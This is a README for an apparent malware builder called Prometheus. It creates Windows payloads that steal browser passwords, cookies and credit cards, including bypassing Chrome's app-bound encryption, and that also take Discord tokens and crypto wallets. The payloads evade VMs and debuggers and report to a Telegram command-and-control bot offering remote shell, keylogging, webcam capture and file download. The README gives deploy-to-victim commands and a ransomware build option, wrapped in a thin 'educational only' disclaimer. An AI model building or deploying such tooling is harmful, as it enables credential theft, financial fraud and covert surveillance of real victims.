# `README.md` — COMPLETE PRODUCTION DOCUMENTATION

```markdown
# Prometheus Offensive Framework

<p align="center">
  <img src="assets/prometheus_banner.png" alt="Prometheus Framework Banner" width="800"/>
</p>

<p align="center">
  <strong>Sovereign, Modular, Cross-Platform Payload Orchestration Engine</strong>
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/Python-3.9%2B-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Version-2.0.0-red?style=flat-square" alt="Version"/></a>
  <a href="#"><img src="https://img.shields.io/badge/License-Educational%20Only-red?style=flat-square" alt="License"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-important?style=flat-square" alt="Platform"/></a>
  <a href="#"><img src="https://img.shields.io/badge/C2-Telegram-blue?style=flat-square" alt="C2"/></a>
  <a href="#"><img src="https://img.shields.io/badge/ABE-v20%20Supported-brightgreen?style=flat-square" alt="ABE"/></a>
</p>

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Key Features](#-key-features)
- [What's New](#-whats-new)
- [Architecture](#-architecture)
- [Quick Start](#-quick-start)
- [Installation](#-installation)
  - [Ubuntu Development Setup](#ubuntu-development-setup)
  - [Windows Setup](#windows-setup)
  - [Docker Deployment](#docker-deployment)
- [Configuration](#-configuration)
- [Usage](#-usage)
  - [Cross-Host Decryption](#cross-host-decryption)
  - [GUI Mode](#gui-mode)
  - [Telegram C2 Mode](#telegram-c2-mode)
  - [Headless Mode](#headless-mode)
  - [API Mode](#api-mode)
- [Module System](#-module-system)
- [Telegram C2 Commands](#-telegram-c2-commands)
- [Project Structure](#-project-structure)
- [Building the ABE Payload](#-building-the-abe-payload)
- [Security Considerations](#-security-considerations)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🎯 Overview

**Prometheus** is a **production-ready, cross-platform offensive security framework** designed for educational purposes and authorized security testing. It combines advanced payload generation, modular architecture, and Telegram-based Command & Control (C2) into a unified orchestration engine.

### What Makes This Different

| Feature | Prometheus | Other Builders |
|---------|------------|----------------|
| **Chrome v20 ABE** | ✅ Full injection support | ❌ Stub/Not supported |
| **Firefox NSS** | ✅ Complete ASN1 PBE | ⚠️ Partial |
| **Cross-Platform Build** | ✅ Build on Ubuntu, run on Windows | ❌ Windows-only |
| **Offline Decryption** | ✅ Cross-host restore | ❌ Requires live browser |
| **Telegram C2** | ✅ Full command set | ⚠️ Discord only |
| **Production Ready** | ✅ All features implemented | ⚠️ Broken/missing |

---

## 🔥 Key Features

### Core Capabilities

| Feature | Description |
|---------|-------------|
| **Chrome v10 DPAPI** | Decrypts passwords, cookies, credit cards from Chrome 80-126 |
| **Chrome v20 ABE** | Decrypts cookies from Chrome 127+ via reflective injection |
| **Firefox NSS** | Decrypts logins using full ASN1 PBE (3DES + AES-256-CBC) |
| **Cross-Host Decryption** | Dump keys + archive on Windows, decrypt offline on Linux/macOS |
| **Telegram C2** | Full command and control via Telegram bot |
| **Cross-Platform GUI** | Build on Ubuntu, target Windows victims |
| **Module System** | Plug-and-play stealer and malware modules |
| **Code Obfuscation** | Multiple levels (none/low/medium/high) |
| **Anti-VM & Anti-Debug** | Built-in detection for sandboxed environments |
| **Docker Support** | Containerized deployment |

### What Gets Decrypted

| Browser | Passwords | Cookies | Credit Cards | History | Bookmarks | Extensions |
|---------|:---------:|:-------:|:------------:|:-------:|:---------:|:----------:|
| Chrome 80-126 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Chrome 127+ | ✅ | ✅* | ✅ | ✅ | ✅ | ✅ |
| Edge | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Brave | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Opera | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Firefox | ✅ | ❌ | ❌ | ✅ | ✅ | ✅ |
| Yandex | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |

*Chrome 127+ cookies require ABE v20 injection (fully supported)

---

## 🆕 What's New (v2.0)

| Feature | Description |
|---------|-------------|
| **Complete ABE v20 Injection** | Full reflective injection implementation with ctypes |
| **Firefox ASN1 PBE** | Complete parser supporting 3DES + AES-256-CBC |
| **Cross-Platform Build** | Build Windows EXE on Ubuntu (no Windows VM needed) |
| **Zig Integration** | Build ABE payload on Linux with zig |
| **Wine Support** | Test Windows EXE on Linux via Wine |
| **Comprehensive Logging** | Debug-level logging for all operations |
| **Error Handling** | Proper try/except with meaningful messages |

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        YOUR DEVELOPMENT MACHINE                            │
│                              (Ubuntu)                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│  ┌─────────────────────┐  ┌─────────────────────────────────────────────┐ │
│  │    Wine/Wine64     │  │         Python + Dependencies               │ │
│  │  - Windows API     │  │  - cryptography                             │ │
│  │  - PE execution    │  │  - pyinstaller (cross-compile)              │ │
│  └─────────────────────┘  └─────────────────────────────────────────────┘ │
│           │                            │                                  │
│           ▼                            ▼                                  │
│  ┌─────────────────────────────────────────────────────────────────────┐  │
│  │              Zig (ABE Payload Builder)                              │  │
│  │  - Compiles C payload → abe_extractor_amd64.bin                    │  │
│  └─────────────────────────────────────────────────────────────────────┘  │
│                                    │                                      │
│                                    ▼                                      │
│  ┌─────────────────────────────────────────────────────────────────────┐  │
│  │              PyInstaller (Cross-Compile)                            │  │
│  │  - Python script → prometheus_payload.exe                           │  │
│  └─────────────────────────────────────────────────────────────────────┘  │
│                                    │                                      │
│                                    ▼                                      │
│  ┌─────────────────────────────────────────────────────────────────────┐  │
│  │              Production Payload (.exe)                              │  │
│  │  - Runs on Windows victims                                          │  │
│  │  - Full Chrome v20 ABE injection                                    │  │
│  │  - Full Firefox NSS decryption                                      │  │
│  │  - Cross-host dumpkeys + archive                                    │  │
│  └─────────────────────────────────────────────────────────────────────┘  │
│                                    │                                      │
│                                    ▼                                      │
│  ┌─────────────────────────────────────────────────────────────────────┐  │
│  │              Telegram Bot API                                       │  │
│  │  - Receives keys.json + data.zip                                   │  │
│  │  - Commands: /shell, /download, /screenshot, /keylog, /webcam     │  │
│  └─────────────────────────────────────────────────────────────────────┘  │
│                                    │                                      │
│                                    ▼                                      │
│  ┌─────────────────────────────────────────────────────────────────────┐  │
│  │              Cross-Host Restore (Linux/macOS)                       │  │
│  │  - python main.py restore -k keys.json -a data.zip -o decrypted/  │  │
│  │  - Decrypts everything offline                                     │  │
│  └─────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### One-Line Install (Ubuntu)

```bash
# Clone and setup everything
git clone https://github.com/yourorg/prometheus.git
cd prometheus
./setup_ubuntu.sh

# Build the Windows EXE
./build_windows_exe.sh

# Run the framework
./run.sh
```

### One-Line Deploy

```bash
# On Ubuntu, build the payload
./build_windows_exe.sh

# Copy to victim
scp dist/windows/prometheus_payload.exe victim@target:/tmp/

# On victim (Windows), run the payload
prometheus_payload.exe

# On Ubuntu, analyze results
python main.py restore -k keys.json -a data.zip -o decrypted/
```

---

## 📦 Installation

### Ubuntu Development Setup (Recommended)

```bash
# 1. Clone the repository
git clone https://github.com/yourorg/prometheus.git
cd prometheus

# 2. Run the setup script (installs all dependencies)
./setup_ubuntu.sh

# This installs:
#   - Python 3.9+ and virtual environment
#   - Wine (for testing Windows EXE)
#   - Zig (for building ABE payload)
#   - mingw-w64 (for cross-compilation)
#   - All Python dependencies
#   - Builds the ABE payload

# 3. Activate the virtual environment
source venv/bin/activate

# 4. Build the Windows EXE
./build_windows_exe.sh

# 5. Run the framework
./run.sh
```

### Manual Ubuntu Setup

```bash
# Install system dependencies
sudo apt update && sudo apt install -y \
    python3 python3-pip python3-venv python3-dev \
    build-essential git wget curl unzip \
    mingw-w64 mingw-w64-tools \
    wine wine32 wine64 winetricks \
    libwine libwine:i386 fonts-wine

# Install Zig
ZIG_VERSION="0.13.0"
wget -O /tmp/zig.tar.xz "https://ziglang.org/download/${ZIG_VERSION}/zig-linux-x86_64-${ZIG_VERSION}.tar.xz"
sudo tar -xf /tmp/zig.tar.xz -C /usr/local
sudo mv "/usr/local/zig-linux-x86_64-${ZIG_VERSION}" /usr/local/zig
sudo ln -sf /usr/local/zig/zig /usr/local/bin/zig

# Build ABE payload
git clone https://github.com/moonD4rk/HackBrowserData /tmp/HackBrowserData
cd /tmp/HackBrowserData
make payload
cp crypto/windows/payload/abe_extractor_amd64.bin /tmp/
cd /tmp
rm -rf /tmp/HackBrowserData

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install Python packages
pip install --upgrade pip
pip install \
    cryptography==41.0.7 \
    pywin32-ctypes==0.2.2 \
    psutil==5.9.6 \
    customtkinter==5.2.1 \
    jinja2==3.1.2 \
    pyyaml==6.0.1 \
    requests==2.31.0 \
    python-dotenv==1.0.0 \
    python-telegram-bot==20.6 \
    pyinstaller==6.3.0

# Copy ABE payload
cp /tmp/abe_extractor_amd64.bin core/
```

### Windows Setup

```batch
git clone https://github.com/yourorg/prometheus.git
cd prometheus
python -m venv venv
venv\Scripts\activate
pip install -r requirements.txt
python main.py
```

### Docker Deployment

```bash
# Build the Docker image
docker build -t prometheus .

# Run the container
docker run -d -p 5000:5000 --name prometheus prometheus

# Or use docker-compose
docker-compose up -d
```

---

## ⚙️ Configuration

### Configuration File (`config/config.json`)

```json
{
  "version": "2.0.0",
  "payload_type": "full",
  "output_path": "dist/payload.exe",
  "file_name": "prometheus_payload",
  "icon_path": "",
  "obfuscation_level": "medium",
  "anti_vm": true,
  "anti_debug": true,
  "persistence": false,
  "self_destruct": false,
  "cross_host": true,
  
  "telegram_bot_token": "YOUR_BOT_TOKEN_HERE",
  "telegram_chat_id": "YOUR_CHAT_ID_HERE",
  "telegram_allowed_chat_ids": [],
  
  "modules": {
    "system_info": true,
    "browser_stealer": true,
    "discord_tokens": true,
    "crypto_wallets": true,
    "screenshot": true,
    "webcam": false,
    "telegram_c2": true,
    "persistence": false,
    "block_key": false,
    "block_mouse": false,
    "shutdown": false
  },
  
  "module_configs": {
    "telegram_c2": {
      "enabled": true,
      "bot_token": "YOUR_BOT_TOKEN_HERE",
      "chat_id": "YOUR_CHAT_ID_HERE"
    },
    "browser_stealer": {
      "enabled": true,
      "categories": ["password", "cookie", "history", "bookmark", "creditcard"]
    }
  }
}
```

---

## 🖥️ Usage

### Cross-Host Decryption (Recommended Workflow)

This is the primary use case: extract keys and data on Windows, decrypt on Ubuntu/Linux.

#### Step 1: Dump Keys (On Victim Windows)

```bash
# Run the payload on the victim machine
prometheus_payload.exe

# Or manually dump keys
python main.py dumpkeys -p "C:\Users\user\AppData\Local\Google\Chrome\User Data\Default" -o keys.json

# For Firefox
python main.py dumpkeys -p "C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\xyz.default" -t firefox -o firefox_keys.json
```

#### Step 2: Archive Data (On Victim Windows)

```bash
# Archive Chrome profile data
python main.py archive -p "C:\Users\user\AppData\Local\Google\Chrome\User Data\Default" -o data.zip

# Archive with specific categories
python main.py archive -p "C:\Users\user\AppData\Local\Google\Chrome\User Data\Default" -c password,cookie -o data.zip
```

#### Step 3: Restore and Decrypt (On Ubuntu Linux)

```bash
# Copy keys.json and data.zip to your Linux machine

# Restore and decrypt
python main.py restore -k keys.json -a data.zip -o decrypted/

# Output will be in decrypted/password/, decrypted/cookie/, etc.
```

### GUI Mode

Launch the graphical interface:

```bash
python main.py
```

**GUI Features:**
- Webhook configuration with test button
- Module selection with category tabs
- File settings (name, type, icon)
- Payload settings (type, obfuscation, anti-VM, anti-debug, persistence)
- Cross-host toggle
- Real-time progress tracking
- One-click build

### Telegram C2 Mode

Run as a persistent Telegram bot:

```bash
python main.py --telegram --config config/config.json
```

**What happens:**
1. Bot connects to Telegram
2. Sends startup notification with system info
3. Listens for commands 24/7
4. Executes commands on the host
5. Sends responses back via Telegram

### Headless Mode

Generate payloads from the command line:

```bash
# Generate a full payload
python main.py build --output payload.exe --type full

# Generate a stealer only
python main.py build --output stealer.exe --type stealer

# Generate ransomware
python main.py build --output ransomware.exe --type ransomware
```

### API Mode

Start the REST API server:

```bash
python -m api.routes
```

**API Endpoints:**

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/status` | GET | Check API status |
| `/api/modules` | GET | List all modules |
| `/api/modules/<id>/enable` | POST | Enable/disable a module |
| `/api/config` | GET/POST | Get or set configuration |
| `/api/build` | POST | Trigger a build |

---

## 🧩 Module System

### Available Modules

**Stealer Modules:**

| Module | Description |
|--------|-------------|
| `system_info` | OS, CPU, RAM, disk, hostname, username, IP |
| `browser_stealer` | Chrome v10/v20 ABE, Firefox NSS decryption |
| `discord_tokens` | Extract Discord tokens |
| `crypto_wallets` | Exodus, Electrum, Atomic, Binance wallets |
| `screenshot` | Full-screen capture |
| `webcam` | Capture from available webcam |

**Malware Modules:**

| Module | Description |
|--------|-------------|
| `telegram_c2` | Full C2 via Telegram bot |
| `block_key` | Disable keyboard input |
| `block_mouse` | Disable mouse input |
| `shutdown` | Schedule system shutdown |
| `persistence` | Launch at startup |

### Creating a Custom Module

```python
from modules.base import Module
from typing import Dict, Any

class CustomModule(Module):
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.name = "Custom Module"
        self.id = "custom_module"
        self.category = "stealer"

    def get_template(self) -> str:
        return """
# Custom Module Template
def custom_function():
    # Your code here
    pass
"""

    def get_config_schema(self) -> Dict[str, Any]:
        return {
            "enabled": {"type": "boolean", "default": False, "label": "Enable Custom Module"},
        }
```

---

## 📡 Telegram C2 Commands

| Command | Description | Example |
|---------|-------------|---------|
| `/start` | Initialize session | `/start` |
| `/status` | Get system status | `/status` |
| `/shell <cmd>` | Execute shell command | `/shell whoami` |
| `/download <path>` | Download a file | `/download C:\Users\admin\Desktop\file.txt` |
| `/screenshot` | Take a screenshot | `/screenshot` |
| `/keylog start` | Start keylogger | `/keylog start` |
| `/keylog stop` | Stop keylogger | `/keylog stop` |
| `/keylog dump` | Get keylog data | `/keylog dump` |
| `/webcam` | Take webcam photo | `/webcam` |
| `/kill` | Self-destruct | `/kill` |
| `/help` | Show help | `/help` |

---

## 📁 Project Structure

```
prometheus/
├── main.py                          # Entry point
├── requirements.txt                 # Production dependencies
├── setup_ubuntu.sh                  # Ubuntu setup script
├── build_windows_exe.sh             # Windows EXE builder
├── run.sh                           # Run script
├── test_wine.sh                     # Wine test script
├── Dockerfile                       # Docker container
├── docker-compose.yml               # Docker Compose
├── README.md                        # This file
│
├── core/
│   ├── __init__.py
│   ├── cross_host.py                # Main decryption engine
│   ├── abe_payload.py               # ABE payload loader
│   ├── abe_injector.py              # ABE reflective injection
│   ├── asn1_pbe.py                  # Firefox ASN1 PBE parser
│   ├── c2_telegram.py               # Telegram C2 backend
│   ├── engine.py                    # Orchestration engine
│   └── crypto.py                    # Encryption utilities
│
├── modules/
│   ├── base.py                      # Module base class
│   ├── registry.py                  # Module discovery
│   ├── stealer/
│   │   ├── system.py                # System info
│   │   ├── browser.py               # Browser stealer
│   │   └── discord.py               # Discord tokens
│   └── malware/
│       └── telegram_c2.py           # Telegram C2 module
│
├── payload/
│   └── templates/                   # Jinja2 templates
│       ├── base.py.j2
│       ├── cross_host.py.j2
│       └── telegram_payload.py.j2
│
├── gui/
│   ├── app.py                       # Main window
│   └── builder_panel.py             # Build configuration
│
├── config/
│   └── config.json                  # Configuration
│
└── dist/
    └── windows/
        └── prometheus_payload.exe   # Built Windows EXE
```

---

## 🔧 Building the ABE Payload

The ABE payload is required for Chrome 127+ cookie decryption. It's built using Zig.

### On Ubuntu

```bash
# Install Zig
ZIG_VERSION="0.13.0"
wget -O /tmp/zig.tar.xz "https://ziglang.org/download/${ZIG_VERSION}/zig-linux-x86_64-${ZIG_VERSION}.tar.xz"
sudo tar -xf /tmp/zig.tar.xz -C /usr/local
sudo mv "/usr/local/zig-linux-x86_64-${ZIG_VERSION}" /usr/local/zig
sudo ln -sf /usr/local/zig/zig /usr/local/bin/zig

# Build ABE payload
git clone https://github.com/moonD4rk/HackBrowserData /tmp/HackBrowserData
cd /tmp/HackBrowserData
make payload
cp crypto/windows/payload/abe_extractor_amd64.bin /path/to/prometheus/core/
```

### On Windows

```bash
# Install zig
scoop install zig

# Clone and build
git clone https://github.com/moonD4rk/HackBrowserData
cd HackBrowserData
make payload
copy crypto\windows\payload\abe_extractor_amd64.bin ..\prometheus\core\
```

---

## 🔒 Security Considerations

### For Operators

1. **Never** store plaintext webhooks in code
2. **Rotate** bot tokens and keys regularly
3. **Restrict** access to known chat IDs
4. **Enable** logging for audit trails
5. **Never** commit `config/config.json` to version control
6. **Use** Docker for isolated deployment

### For Targets (Ethical Testing Only)

1. **Only** test on systems you own or have explicit permission
2. **Always** use isolated VMs for testing
3. **Never** deploy on production systems
4. **Document** all testing activities
5. **Clean up** after testing

---

## ⚠️ Disclaimer

<div align="center">
  <strong>⚠️ EDUCATIONAL AND RESEARCH PURPOSES ONLY ⚠️</strong>
</div>

<br>

This software is provided **for educational and cybersecurity research purposes only**. It must not be used for illegal or malicious activities.

**By using this software, you agree to:**

1. **Only** use it in a legal and authorized context
2. Have the **necessary authorizations** for any test or activity
3. Accept that the author **cannot under any circumstances** be held liable for your actions
4. **Never** use this tool to attack systems without explicit authorization

### Full Limitation of Liability

The author, contributors, and maintainers of this project **disclaim all responsibility** and **fully exempt themselves** from any legal, criminal, civil, or contractual obligation, including but not limited to:

- Any responsibility arising from the **use** of this software
- Any **damage** direct, indirect, incidental, or consequential
- Any **legal proceedings**, **fines**, **sanctions**, or **convictions**
- Any **law violation** committed by the user
- Any **data loss** or **system compromise**
- Any **content** exfiltrated, encrypted, or modified via this tool

### Prohibitions

The use of this software to **attack systems without explicit authorization** is **prohibited** and may be **punishable by law**. The author disclaims all responsibility in case of misuse.

---

## 📄 License

This project is **not for commercial use**. Use is strictly limited to:

- **Educational purposes** (learning cybersecurity concepts)
- **Authorized security testing** (with explicit permission)
- **Research** (understanding offensive security techniques)

The author **does not grant permission** to use this software for:

- Any illegal activity
- Unauthorized penetration testing
- Malicious purposes of any kind
- Commercial applications without explicit written consent

---

## 📚 Resources

- [HackBrowserData](https://github.com/moonD4rk/HackBrowserData) - Original Go implementation
- [Telegram Bot API](https://core.telegram.org/bots/api)
- [PyInstaller](https://pyinstaller.org/)
- [Zig Programming Language](https://ziglang.org/)
- [RFC-010: Chrome ABE Integration](https://github.com/moonD4rk/HackBrowserData/blob/main/rfcs/010-chrome-abe-integration.md)

---

## 📞 Contact & Support

- **GitHub**: [https://github.com/yourorg/prometheus](https://github.com/yourorg/prometheus)
- **Issues**: [https://github.com/yourorg/prometheus/issues](https://github.com/yourorg/prometheus/issues)

---

<p align="center">
  <strong>Built with ❤️ for cybersecurity education</strong>
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/Made%20with-Python-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Made with Python"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Powered%20by-Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Powered by Telegram"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Built%20with-Zig-F7A41D?style=for-the-badge&logo=zig&logoColor=white" alt="Built with Zig"/></a>
</p>

<p align="center">
  <strong>Prometheus Framework v2.0.0</strong><br>
  <em>Know Thy Code. Know Thy System. Control Thy Domain.</em>
</p>
```
